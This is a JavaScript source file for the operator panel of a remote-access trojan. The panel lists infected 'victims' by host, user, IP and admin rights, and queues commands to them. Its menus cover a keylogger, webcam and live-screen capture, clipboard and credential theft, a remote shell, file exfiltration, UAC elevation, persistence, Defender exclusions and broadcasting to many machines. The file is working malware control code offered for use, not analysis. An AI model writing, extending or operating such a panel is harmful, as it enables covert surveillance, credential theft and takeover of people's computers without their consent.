// Operator panel. The grid is the whole product: one row per agent, a
// right-click on the row opens the module tree, and every module is a queued
// command whose output lands in a floating window. Nothing is pushed to an
// agent, so a module window that is closed loses nothing - it can be reopened
// and re-read from history.

const state = {
  victims: [],
  sort: { key: "idle", dir: 1 },
  filter: "",
  selected: null,
  // Multi-select mirrors the XWorm grid: ctrl/shift to build a set, right-click
  // to fire one command at all of them. Kept by agent id, so a grid refresh
  // never drops a pick.
  multi: new Set(),
  lastPick: null,
  visible: [],
  windows: new Map(),
  timer: null
};

const $ = (id) => document.getElementById(id);

// Every string below this line comes from an agent, and an agent is whatever is
// running on the other machine. Unescaped, a filename like
// `<img src=x onerror=...>` runs in the operator's session and can queue
// commands against every other victim.
const esc = (v) =>
  String(v == null ? "" : v)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");

async function api(path, opts) {
  const res = await fetch(path, Object.assign({ credentials: "same-origin" }, opts || {}));
  if (res.status === 401) {
    showLogin(true);
    throw new Error("auth");
  }
  return res.json();
}

function showLogin(show) {
  $("login").style.display = show ? "flex" : "none";
  if (show) setTimeout(() => $("pass").focus(), 50);
}

$("btn-login").addEventListener("click", async () => {
  const pass = $("pass").value;
  const res = await fetch("/api/login", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ pass })
  });
  if (res.ok) {
    $("login-err").textContent = "";
    $("pass").value = "";
    showLogin(false);
    await loadActions();
    tick();
  } else {
    $("login-err").textContent = "mot de passe refusé";
  }
});
$("pass").addEventListener("keydown", (e) => {
  if (e.key === "Enter") $("btn-login").click();
});

$("btn-logout").addEventListener("click", async () => {
  await fetch("/api/logout");
  showLogin(true);
});

$("btn-refresh").addEventListener("click", tick);
$("filter").addEventListener("input", (e) => {
  state.filter = e.target.value.toLowerCase();
  render();
});

document.querySelectorAll("thead th").forEach((th) => {
  th.addEventListener("click", () => {
    const key = th.dataset.sort;
    state.sort = { key, dir: state.sort.key === key ? -state.sort.dir : 1 };
    render();
  });
});

// ------------------------------------------------------------------ render --
function seen(sec) {
  if (sec < 75) return "à l'instant";
  if (sec < 3600) return Math.floor(sec / 60) + " min";
  if (sec < 86400) return Math.floor(sec / 3600) + " h";
  return Math.floor(sec / 86400) + " j";
}

function statusOf(v) {
  if (v.idle < 120) return "on";
  if (v.idle < 900) return "idle";
  return "off";
}

function render() {
  const rows = state.victims.filter((v) => {
    if (!state.filter) return true;
    return [v.host, v.username, v.os, v.country, v.ip, v.tag, v.id]
      .join(" ").toLowerCase().includes(state.filter);
  });

  rows.sort((a, b) => {
    const k = state.sort.key;
    let x = a[k], y = b[k];
    if (k === "idle") { x = a.idle; y = b.idle; }
    if (typeof x === "boolean") { x = x ? 1 : 0; y = y ? 1 : 0; }
    if (typeof x === "number") return (x - y) * state.sort.dir;
    return String(x || "").localeCompare(String(y || "")) * state.sort.dir;
  });

  const tb = $("rows");
  tb.innerHTML = "";
  state.visible = rows;
  for (const v of rows) {
    const tr = document.createElement("tr");
    const picked = state.multi.has(v.id);
    if (state.selected === v.id) tr.className = "sel";
    if (picked) tr.className = (tr.className ? tr.className + " " : "") + "picked";
    const st = statusOf(v);
    tr.innerHTML = `
      <td class="pick"><input type="checkbox"${picked ? " checked" : ""}></td>
      <td><span class="dot ${st}"></span>${esc(v.host || "?")}</td>
      <td>${esc(v.username || "-")}</td>
      <td>${esc(v.os || "-")}</td>
      <td>${esc(v.country || "-")}</td>
      <td>${esc(v.ip || "-")}</td>
      <td>${v.admin ? '<span class="tag admin">ADMIN</span>' : '<span class="tag">user</span>'}</td>
      <td>${esc(v.active_window || "-")}</td>
      <td>${Number(v.ping_ms) || 0} ms</td>
      <td>${seen(Number(v.idle) || 0)}</td>
      <td>${esc(v.tag || "")}</td>`;
    tr.addEventListener("contextmenu", (e) => e.preventDefault());
    tr.addEventListener("mousedown", (e) => {
      const box = e.target && e.target.tagName === "INPUT";
      if (e.button === 2) {
        // the document-level closer also listens on mousedown: it saw this
        // same event bubble up, found the target outside #menu and closed it
        // again, so the right-click menu never survived a frame
        e.preventDefault();
        e.stopPropagation();
        state.selected = v.id;
        render();
        // right-click on a picked row acts on the whole selection; on any other
        // row it acts on that row alone, so one stray right-click never fires a
        // command at six machines
        const targets =
          state.multi.has(v.id) && state.multi.size > 1
            ? rows.filter((r) => state.multi.has(r.id))
            : [v];
        openMenu(e.clientX, e.clientY, targets);
      } else if (box) {
        // let the native checkbox toggle, then mirror it into the set
        e.stopPropagation();
        setTimeout(() => pick(v.id, !state.multi.has(v.id)), 0);
      } else if (e.shiftKey && state.lastPick) {
        const ids = rows.map((r) => r.id);
        const a = ids.indexOf(state.lastPick);
        const b = ids.indexOf(v.id);
        if (a >= 0 && b >= 0)
          for (let i = Math.min(a, b); i <= Math.max(a, b); ++i) state.multi.add(ids[i]);
        state.lastPick = v.id;
        state.selected = v.id;
        render();
      } else if (e.ctrlKey || e.metaKey) {
        if (state.multi.has(v.id)) state.multi.delete(v.id);
        else state.multi.add(v.id);
        state.lastPick = v.id;
        state.selected = v.id;
        render();
      } else {
        state.selected = v.id;
        state.lastPick = v.id;
        render();
      }
    });
    tr.addEventListener("dblclick", () => openModule(v, "info"));
    tb.appendChild(tr);
  }

  const online = state.victims.filter((v) => v.idle < 120).length;
  const queued = state.victims.reduce((n, v) => n + Number(v.queued || 0), 0);
  $("s-on").textContent = online;
  $("s-all").textContent = state.victims.length;
  $("s-q").textContent = queued;
  // the beacon announces how long it holds its poll open; show the slowest live agent
  const pings = state.victims
    .filter((v) => v.idle < 120)
    .map((v) => Number(v.ping_ms) || 0)
    .filter(Boolean);
  $("s-lat").textContent = pings.length ? Math.round(Math.max(...pings) / 1000) + " s" : "—";

  // Drop picks whose agent left the console, then mirror the set into the bar.
  const live = new Set(state.victims.map((v) => v.id));
  for (const id of [...state.multi]) if (!live.has(id)) state.multi.delete(id);

  const n = state.multi.size;
  $("pickcount").textContent = n ? n + " sélectionné" + (n > 1 ? "s" : "") : "0";
  $("pickbar").classList.toggle("show", n > 0);
  const all = $("pick-all");
  if (all) {
    all.checked = rows.length > 0 && rows.every((r) => state.multi.has(r.id));
    all.indeterminate = !all.checked && rows.some((r) => state.multi.has(r.id));
  }
}

// Single entry point for changing a pick, so the checkbox, the ctrl-click and
// the header tri-state can never drift apart.
function pick(id, on) {
  if (on) state.multi.add(id);
  else state.multi.delete(id);
  render();
}

async function tick() {
  try {
    const data = await api("/api/victims");
    if (data.ok) {
      // A valid cookie at load time still left the overlay up: only the login
      // handler ever hid it, so a refresh looked like an expired session and
      // the operator retyped the password for nothing.
      showLogin(false);
      state.victims = data.victims;
      render();
      // Only windows still on screen: the map keeps closed ones, and every
      // refresh is a full history round trip.
      for (const win of state.windows.values())
        if (win.poll && win.el.classList.contains("show")) win.poll();
    }
  } catch (e) {
    /* auth handled upstream */
  }
}

// -------------------------------------------------------------------- menu --
// Fallback only. The server owns the module tree now (GET /api/actions) so a
// verb the agent stopped handling can never keep a button on the panel. This
// list is what renders when the registry is unreachable or the session is not
// authenticated yet, and it must stay a subset of what server.js advertises.
const FALLBACK_MODULES = [
  {
    label: "Système",
    items: [
      { label: "Informations", verb: "info" },
      { label: "Posture / privilèges", verb: "status" },
      { label: "Processus", verb: "ps" },
      { label: "Services", verb: "service_list" },
      { label: "Démarrage", verb: "startup_list" },
      { label: "Tâches planifiées", verb: "task_list" },
      { label: "Registre (Run)", verb: "registry_list" },
      { label: "Disques", verb: "drives" },
      { label: "Antivirus", verb: "av" }
    ]
  },
  {
    label: "Fichiers",
    items: [
      { label: "Explorateur", verb: "ls", args: "" },
      { label: "Bureau", verb: "ls", args: "%USERPROFILE%\Desktop" },
      { label: "Documents", verb: "ls", args: "%USERPROFILE%\Documents" },
      { label: "Téléchargements", verb: "ls", args: "%USERPROFILE%\Downloads" },
      { label: "Changer de dossier", verb: "cd", prompt: "chemin du dossier" },
      { label: "Exécuter", verb: "run", prompt: "chemin du fichier" },
      { label: "Récupérer un fichier", verb: "download", prompt: "chemin complet" },
      { label: "Déposer depuis une URL", verb: "upload", prompt: "url puis chemin" },
      { label: "Fichier hosts", verb: "hosts" }
    ]
  },
  {
    label: "Surveillance",
    items: [
      { label: "Capture d'écran", verb: "screen" },
      { label: "Rafale (3 frames)", verb: "burst", args: "3" },
      { label: "Caméra", verb: "cam" },
      { label: "Caméra ▸ 2e périphérique", verb: "cam", args: "1" },
      { label: "Presse-papiers", verb: "clip" },
      { label: "Keylogger ▸ démarrer", verb: "keylog", args: "on" },
      { label: "Keylogger ▸ arrêter", verb: "keylog", args: "off" },
      { label: "Keylogger ▸ dump", verb: "keylog", args: "dump" },
      { label: "Keylogger ▸ effacer", verb: "keylog", args: "clear" }
    ]
  },
  {
    label: "Réseau",
    items: [
      { label: "Shell", verb: "shell", prompt: "commande" },
      { label: "WiFi", verb: "wifi" },
      { label: "Connexions", verb: "netstat" },
      { label: "Navigateurs", verb: "browsers" }
    ]
  },
  {
    label: "Récupération",
    items: [
      { label: "Voler les identifiants", verb: "steal" },
      { label: "État du bundle", verb: "zipinfo" },
      { label: "Lister les fichiers reçus", verb: "_uploads" },
      { label: "Historique des commandes", verb: "_history" }
    ]
  },
  {
    label: "Élévation",
    items: [
      { label: "Chaîne UAC", verb: "elevate" },
      { label: "Reprendre la session en high", verb: "reclaim" },
      { label: "Réinstaller la persistance", verb: "persist" },
      { label: "Extension navigateur", verb: "ext" },
      { label: "Exclusions Defender", verb: "defender" }
    ]
  },
  {
    label: "Contrôle",
    items: [
      { label: "Chat", verb: "_chat" },
      { label: "Message box", verb: "msg", prompt: "texte affiché" },
      { label: "Ouvrir une URL", verb: "open", prompt: "https://…" },
      { label: "Recherche Google", verb: "search", prompt: "requête" },
      { label: "Fond d'écran", verb: "wallpaper", prompt: "url ou chemin" },
      { label: "Volume +", verb: "volume", args: "up" },
      { label: "Volume -", verb: "volume", args: "down" },
      { label: "Muet", verb: "volume", args: "mute" },
      { label: "Faire parler", verb: "say", prompt: "texte" },
      { label: "Taper du texte", verb: "type", prompt: "texte" },
      { label: "Écrans éteints", verb: "monitors" },
      { label: "Rotate 90", verb: "rotate", args: "90" },
      { label: "Rotate 0", verb: "rotate", args: "0" },
      { label: "Couleurs inversées", verb: "invert", args: "on" },
      { label: "Couleurs normales", verb: "invert", args: "off" },
      { label: "Barre des tâches ▸ cacher", verb: "taskbar", args: "hide" },
      { label: "Barre des tâches ▸ rendre", verb: "taskbar", args: "show" },
      { label: "Serpent", verb: "snake", args: "60" },
      { label: "Rickroll", verb: "rickroll" },
      { label: "Écran factice", verb: "decoy", args: "150" },
      { label: "Écran de verrouillage", verb: "power", args: "lock" },
      { label: "Flotte", verb: "fleet" },
      { label: "Blue screen factice", verb: "bsod", args: "90" },
      { label: "Éteindre", verb: "power", args: "shutdown" },
      { label: "Redémarrer", verb: "power", args: "restart" },
      { label: "Désinstaller", verb: "uninstall" }
    ]
  }
];

let MODULES = FALLBACK_MODULES;

// Pulls the authoritative tree. A malformed or empty answer leaves the
// fallback in place: a panel with no menu is worse than a panel with one stale
// entry, and the stale entry at least fails loudly with "verbe non implemente".
async function loadActions() {
  try {
    const res = await fetch("/api/actions", { credentials: "same-origin" });
    if (!res.ok) return;
    const body = await res.json();
    const groups = Array.isArray(body && body.groups) ? body.groups : null;
    if (!groups || groups.length === 0) return;
    MODULES = groups.filter(
      (g) => g && typeof g.label === "string" && Array.isArray(g.items) && g.items.length
    );
  } catch (e) {
    /* offline or logged out: keep the fallback */
  }
}

let menuEl = null;

function closeMenus() {
  if (menuEl) {
    menuEl.remove();
    menuEl = null;
  }
}

document.addEventListener("mousedown", (e) => {
  if (menuEl && !menuEl.contains(e.target)) closeMenus();
});
document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") closeMenus();
});

function openMenu(x, y, victims) {
  closeMenus();
  const many = victims.length > 1;
  const el = document.createElement("div");
  el.id = "menu";
  el.style.display = "block";

  const head = document.createElement("div");
  head.className = "head";
  head.textContent = many
    ? victims.length + " postes · " + victims.map((v) => v.host || "?").slice(0, 3).join(", ") +
      (victims.length > 3 ? "…" : "")
    : (victims[0].host || "?") + " · " + (victims[0].username || "-");
  el.appendChild(head);

  for (const group of MODULES) {
    const item = document.createElement("div");
    item.className = "item";
    item.innerHTML = `<span>${group.label}</span><span class="arrow">▸</span>`;

    const sub = document.createElement("div");
    sub.className = "sub";
    for (const mod of group.items) {
      const mi = document.createElement("div");
      mi.className = "item";
      mi.innerHTML = `<span>${mod.label}</span>`;
      mi.addEventListener("click", () => {
        closeMenus();
        dispatch(victims, mod);
      });
      sub.appendChild(mi);
    }
    item.appendChild(sub);
    item.addEventListener("mouseenter", () => {
      const r = item.getBoundingClientRect();
      sub.style.left = r.right + 2 + "px";
      sub.style.top = Math.min(r.top, window.innerHeight - sub.offsetHeight - 8) + "px";
    });
    el.appendChild(item);
  }

  el.appendChild(Object.assign(document.createElement("div"), { className: "sep" }));

  const del = document.createElement("div");
  del.className = "item";
  del.innerHTML = `<span style="color:#f88">Supprimer la victime</span>`;
  del.addEventListener("click", async () => {
    closeMenus();
    if (many) return;  // one target, one delete: never a bulk wipe by accident
    if (!confirm("Supprimer " + victims[0].host + " de la console ?")) return;
    await api("/api/remove", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ vid: victims[0].id })
    });
    tick();
  });
  el.appendChild(del);

  el.style.left = Math.min(x, window.innerWidth - 250) + "px";
  el.style.top = Math.min(y, window.innerHeight - 320) + "px";
  document.body.appendChild(el);
  menuEl = el;
}

// ---------------------------------------------------------------- dispatch --
function dispatch(victims, mod) {
  const one = victims[0];
  if (mod.verb === "_uploads") return openUploads(one);
  if (mod.verb === "_history") return openHistory(one);
  if (mod.verb === "_chat") return openChat(one);
  if (mod.verb === "_live") return openLive(one);

  // The registry marks verbs that end the session or wipe state. A misfired
  // right-click on "Éteindre" should not power off a machine mid-job, and the
  // prompt names the count so a broadcast is never mistaken for a single shot.
  const scope = victims.length > 1 ? victims.length + " postes" : (one.host || one.id);
  if (mod.danger && !confirm(mod.label + " sur " + scope + " ?")) return;

  let args = mod.args || "";
  if (mod.prompt) {
    const value = prompt(mod.label, args);
    if (value === null) return;
    args = value;
  }
  // Sequential on purpose: a broadcast to six agents is six rows in the queue,
  // and firing them in parallel only reorders the console log for nothing.
  void (async () => {
    for (const v of victims) await sendRaw(v, mod.verb, args);
    tick();
    for (const v of victims) openModule(v, mod.verb, mod.label);
  })();
}

async function sendRaw(victim, verb, args) {
  try {
    await api("/api/queue", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ vid: victim.id, verb, args: args || "" })
    });
  } catch (e) {
    /* one dead target must not abort the rest of a broadcast */
  }
}

async function send(victim, verb, args) {
  await sendRaw(victim, verb, args);
  tick();
}

// ---------------------------------------------------------------- windows --
function makeWindow(key, title, subtitle, onClose) {
  const existing = state.windows.get(key);
  if (existing) {
    existing.el.classList.add("show");
    existing.el.style.zIndex = ++zi;
    return existing;
  }

  const el = document.createElement("div");
  el.className = "win show";
  el.style.zIndex = ++zi;
  el.innerHTML = `
    <div class="bar">
      <div class="name">${esc(title)}</div>
      <div class="vid">${esc(subtitle)}</div>
      <button class="x">×</button>
    </div>
    <div class="body"></div>`;
  document.body.appendChild(el);

  const off = (state.windows.size % 7) * 26;
  el.style.left = 90 + off + "px";
  el.style.top = 70 + off + "px";

  const win = { el, body: el.querySelector(".body"), poll: null };
  state.windows.set(key, win);

  el.querySelector(".x").addEventListener("click", () => {
    el.classList.remove("show");
    if (onClose) onClose();
  });

  const bar = el.querySelector(".bar");
  let drag = null;
  bar.addEventListener("mousedown", (e) => {
    if (e.target.classList.contains("x")) return;
    drag = { x: e.clientX - el.offsetLeft, y: e.clientY - el.offsetTop };
    el.style.zIndex = ++zi;
  });
  window.addEventListener("mousemove", (e) => {
    if (!drag) return;
    el.style.left = Math.max(0, e.clientX - drag.x) + "px";
    el.style.top = Math.max(0, e.clientY - drag.y) + "px";
  });
  window.addEventListener("mouseup", () => { drag = null; });

  return win;
}

let zi = 600;

function openModule(victim, verb, label) {
  const key = victim.id + ":" + verb;
  const win = makeWindow(key, label || verb, victim.host || victim.id);
  win.body.innerHTML = `<pre class="out">en file d'attente…</pre>`;

  const poll = async () => {
    const data = await api("/api/history?vid=" + encodeURIComponent(victim.id));
    if (!data.ok) return;
    const cmd = data.commands.find((c) => c.verb === verb);
    if (!cmd) return;
    const out = win.body.querySelector("pre.out");
    if (!out) return;
    if (cmd.output != null) {
      out.textContent = cmd.output || "(sortie vide)";
      out.dataset.done = "1";
    } else if (cmd.dispatched) {
      out.textContent = "en cours sur l'agent…\n" + (out.dataset.done ? out.textContent : "");
    } else {
      out.textContent = "en file d'attente…";
    }
  };
  win.poll = poll;
  poll();
}

function openHistory(victim) {
  const win = makeWindow(victim.id + ":history", "Historique", victim.host || victim.id);
  const poll = async () => {
    const data = await api("/api/history?vid=" + encodeURIComponent(victim.id));
    if (!data.ok) return;
    win.body.innerHTML = "<pre class='out'>" + data.commands.map((c) => {
      const t = new Date(c.created).toLocaleTimeString("fr-FR");
      const st = c.finished ? "ok" : c.dispatched ? "…" : "file";
      return `${t}  ${String(c.id).padStart(5)}  ${st.padEnd(4)}  ${esc(c.verb)} ${esc(c.args)}`;
    }).join("\n") + "</pre>";
  };
  win.poll = poll;
  poll();
}

function openUploads(victim) {
  const win = makeWindow(victim.id + ":uploads", "Fichiers reçus", victim.host || victim.id);
  const poll = async () => {
    const data = await api("/api/uploads?vid=" + encodeURIComponent(victim.id));
    if (!data.ok) return;
    if (!data.uploads.length) {
      win.body.innerHTML = "<pre class='out'>aucun fichier</pre>";
      return;
    }
    win.body.innerHTML = "<table style='width:100%'><tbody>" +
      data.uploads.map((u) =>
        `<tr><td>${esc(String(u.created).slice(0, 19).replace("T", " "))}</td>
             <td>${esc(u.name)}</td>
             <td>${(Number(u.bytes) / 1024).toFixed(1)} Ko</td>
             <td><a style="color:#6cb6ff" href="/api/download?id=${u.id}">télécharger</a></td></tr>`)
        .join("") + "</tbody></table>";
  };
  win.poll = poll;
  poll();
}

// Live screen viewer. The console cannot push a stream, so the panel drives it:
// one /api/live call reports the newest frame id and only a changed id pulls
// bytes. A 1.2 s poll on top of a 2 fps agent cadence reads as motion without
// re-downloading the same JPEG fifty times a minute.
function openLive(victim) {
  const key = victim.id + ":live";
  const existing = state.windows.get(key);
  if (existing) {
    existing.el.classList.add("show");
    return;
  }

  let timer = null;
  const win = makeWindow(key, "Écran en direct", victim.host || victim.id, () => {
    if (timer) clearInterval(timer);
    timer = null;
  });
  win.body.innerHTML = `
    <div class="row" style="gap:6px;align-items:center;margin-bottom:8px">
      <button data-a="stream">flux 30 s</button>
      <button data-a="once">capture</button>
      <span class="live-state" style="margin-left:auto;opacity:.7"></span>
    </div>
    <div style="background:#0b0d10;border:1px solid #222;border-radius:6px;min-height:240px;display:flex;align-items:center;justify-content:center;overflow:hidden">
      <img alt="" style="max-width:100%;max-height:60vh;display:block">
    </div>`;
  const img = win.body.querySelector("img");
  const stateEl = win.body.querySelector(".live-state");
  let shown = 0;

  win.body.querySelector("[data-a=stream]").addEventListener("click", async () => {
    await sendRaw(victim, "live", "30 2 50");
    stateEl.textContent = "flux demandé…";
  });
  win.body.querySelector("[data-a=once]").addEventListener("click", async () => {
    await sendRaw(victim, "screen", "");
    stateEl.textContent = "capture demandée…";
  });

  const poll = async () => {
    const open = state.windows.get(key);
    if (!open || !open.el.classList.contains("show")) return;
    let data;
    try {
      data = await api("/api/live?vid=" + encodeURIComponent(victim.id));
    } catch (e) {
      return;
    }
    if (!data.ok) return;
    const frame = data.frame;
    if (!frame) {
      stateEl.textContent = "aucune frame reçue";
      return;
    }
    if (Number(frame.id) !== shown) {
      shown = Number(frame.id);
      img.src = "/api/frame?id=" + frame.id + "&t=" + Date.now();
    }
    const age = Math.max(0, Math.round((Date.now() - new Date(frame.created).getTime()) / 1000));
    stateEl.textContent =
      "frame " + frame.id + " · " + (Number(frame.bytes) / 1024).toFixed(0) + " Ko · il y a " + age + " s";
  };
  win.poll = poll;
  poll();
  timer = setInterval(poll, 1200);
}

function openChat(victim) {
  const win = makeWindow(victim.id + ":chat", "Chat", victim.host || victim.id);
  win.body.innerHTML = `
    <pre class="out" style="min-height:180px;max-height:38vh;overflow:auto"></pre>
    <div class="row" style="margin-top:8px">
      <input type="text" placeholder="message…">
      <button>Envoyer</button>
    </div>`;
  const out = win.body.querySelector("pre.out");
  const input = win.body.querySelector("input");
  const btn = win.body.querySelector("button");
  btn.addEventListener("click", async () => {
    if (!input.value) return;
    out.textContent += "opérateur : " + input.value + "\n";
    await send(victim, "chat", input.value);
    input.value = "";
  });
  input.addEventListener("keydown", (e) => {
    if (e.key === "Enter") btn.click();
  });
  const poll = async () => {
    const data = await api("/api/history?vid=" + encodeURIComponent(victim.id));
    if (!data.ok) return;
    const msgs = data.commands.filter((c) => c.verb === "chat" && c.output);
    out.textContent = msgs.reverse().map((c) => "cible : " + c.output).join("\n");
  };
  win.poll = poll;
  poll();
}

// -------------------------------------------------------------------- boot --
// One beat for the whole panel. Every module window used to own a 2.5 s interval
// that refetched the full history, so five open windows meant five requests per
// beat, the tab never went idle and the cursor sat in the loading state the whole
// session. Now a single beat refreshes the grid plus the windows actually on
// screen, skips a hidden tab, and never stacks a request on one still in flight.
showLogin(true);
let beatBusy = false;
async function beat() {
  if (beatBusy || document.hidden) return;
  beatBusy = true;
  try {
    await tick();
  } finally {
    beatBusy = false;
  }
}
// ---- selection bar -------------------------------------------------------
// The header box drives every visible row, so a filtered grid lets you select
// "all the ADMIN ones in FR" instead of clicking twenty rows.
$("pick-all").addEventListener("change", (e) => {
  if (e.target.checked) for (const v of state.visible) state.multi.add(v.id);
  else for (const v of state.visible) state.multi.delete(v.id);
  render();
});

$("pick-clear").addEventListener("click", () => {
  state.multi.clear();
  render();
});

$("pick-menu").addEventListener("click", (e) => {
  const targets = state.victims.filter((v) => state.multi.has(v.id));
  if (!targets.length) return;
  const r = e.currentTarget.getBoundingClientRect();
  openMenu(r.left, r.bottom + 4, targets);
});

loadActions();
beat();
setInterval(beat, 3000);
